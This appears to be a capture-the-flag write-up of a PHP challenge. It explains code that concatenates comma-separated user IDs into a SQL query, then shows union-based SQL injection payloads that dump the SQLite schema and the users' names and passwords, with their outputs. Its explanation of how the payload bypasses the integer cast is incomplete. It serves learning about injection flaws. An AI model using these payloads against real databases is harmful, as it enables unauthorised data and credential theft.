+ When we give id as 1,2,3 we get 
User user_31 with id 1 has no privileges.
User user_99 with id 2 has no privileges.
User user_29 with id 3 has no privileges.
+ When we give id as 0,0,0 we get
User admin with id 0 has all privileges.
+ The explode() function breaks a string into an array


The remaining integers in the array are then concatenated into a string with commas between them using the implode() function. This string is used in a SQL query to select user information from a database table named 'users'. The query returns the user's ID, privileges, and name.
```
<?php
if (isset($_GET['ids'])) {
    if ( ! is_string($_GET['ids'])) {
        die("Don't be silly.");
    }

    if ( strlen($_GET['ids']) > 70) {
        die("Please don't check all the privileges at once.");
    }

  $tmp = explode(',',$_GET['ids']);
  for ($i = 0; $i < count($tmp); $i++ ) {
        $tmp[$i] = (int)$tmp[$i];
        if( $tmp[$i] < 1 ) {
            unset($tmp[$i]);
        }
  }

  $selector = implode(',', array_unique($tmp));

  $query = "SELECT user_id, user_privileges, user_name
  FROM users
  WHERE (user_id in (" . $selector . "));";

  $stmt = $db->query($query);
```
+ If the length of the string is less than or equal to 70, the code uses explode(',',$_GET['ids']) to split the string into an array of user IDs. It then loops through the array and converts each ID to an integer using (int)$tmp[$i]. If the ID is less than 1, it is removed from the array using unset($tmp[$i]).

+the code constructs a SQL query using the user IDs and executes it using $db->query($query), where $db is an instance of a database connection object. The query selects the user_id, user_privileges, and user_name columns from the users table where the user_id is in the list of user IDs provided in the query string parameter
+ implode(): returns a string from the elements of an array.
+ So lets try a basic sqli payload:<br>
payload: ,,,)) union select 1,2, sql as user_id from sqlite_master--<br>
output: User CREATE TABLE users ( user_id INTEGER PRIMARY KEY, user_name TEXT NOT NULL, user_privileges INTEGER NOT NULL, user_password TEXT NOT NULL ) with id 1 has no privileges.<br>
payload: ,,,)) union select 1,user_name,user_password from users --<br>
output: WEBSEC{SQL_injection_in_your_cms,_made_simple}<br>
